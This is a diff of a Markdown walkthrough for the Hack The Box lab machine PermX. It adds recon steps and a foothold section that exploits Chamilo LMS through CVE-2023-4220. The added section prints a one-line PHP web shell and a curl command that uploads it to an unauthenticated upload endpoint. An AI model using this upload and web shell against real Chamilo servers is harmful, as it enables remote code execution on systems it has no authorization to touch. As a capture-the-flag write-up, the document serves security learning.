@@ -2,7 +2,7 @@
 
 URL: https://app.hackthebox.com/machines/PermX
 
-# Tools
+## Tools
 
 - nmap
 - gobuster
@@ -17,7 +17,7 @@ URL: https://app.hackthebox.com/machines/PermX
 
 - With enough probing, you may discover the OS and a few interesting ports.
 
-    - If you are unfamiliar with the ports discovered, checkout the following resource for explanations on the various ports discovered and what they could be used for: https://www.speedguide.net/ports.php?
+    - If you are unfamiliar with the ports discovered, checkout the following resource for identifying common ports and services: https://www.speedguide.net/ports.php?
 
     - Another resource to use when gathering intelligence, is to check CVE lists for ports and services identified on your victim machine, to learn about any documented volnurabilities: https://cve.mitre.org/cve/search_cve_list.html
 
@@ -50,12 +50,38 @@ Nmap done: 1 IP address (1 host up) scanned in 8.14 seconds
 - For the next phase of reconnaissance, we should try scanning for subdomains. The tool I use for this is Gobuster, which has the following syntax:
 
     ```
-    gobuster vhost -w /path/to/wordlist.txt -u permx.htb --append-domain
+    gobuster vhost -w /path/to/wordlist.txt -u http://victim_url.fun --append-domain
     ```
 
     - If you don't know where to get a wordlist for gobuster, checkout SecLists: https://github.com/danielmiessler/SecLists
 
-- After letting gobuster scan for subdomains, you may find a new URL: http://lms.permx.htb
+- After letting gobuster scan for subdomains, you may find a new URL: http://lms.permx.htb. A login page for Chamilo.
+
+## Establishing a foothold
+
+Next, we should search the internet for known chamilo lms exploits. I found the following advisory (CVE-2023-4220): https://starlabs.sg/advisories/23/23-4220/
+
+The bulletin states that Chamilo is PHP based, and confirms a vulnerability that allows an unauthenticated user to upload files to '/main/inc/lib/javascript/bigupload/files'. The bulletin also provides a blueprint for our attack in their proof of concept:
+
+- We start by creating a simple PHP script on our attack machine that uses the system() function to execute commands passed to the 'cmd' parameter through the HTTP GET method. I'll name mine webshell.php
+
+    #### webshell.php
+
+    ```PHP
+    <?php echo system($_GET["cmd"])?>
+    ```
+
+- Next, from our attack machine, we'll use curl to upload webshell.php
+
+    #### Terminal
+
+    ```bash
+    curl -F 'bigUploadFile=@webshell.php' 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported'
+    ```
+
+    - You should receive the following output: The file has successfully been uploaded.
+
+
 
 # Additional resources
 
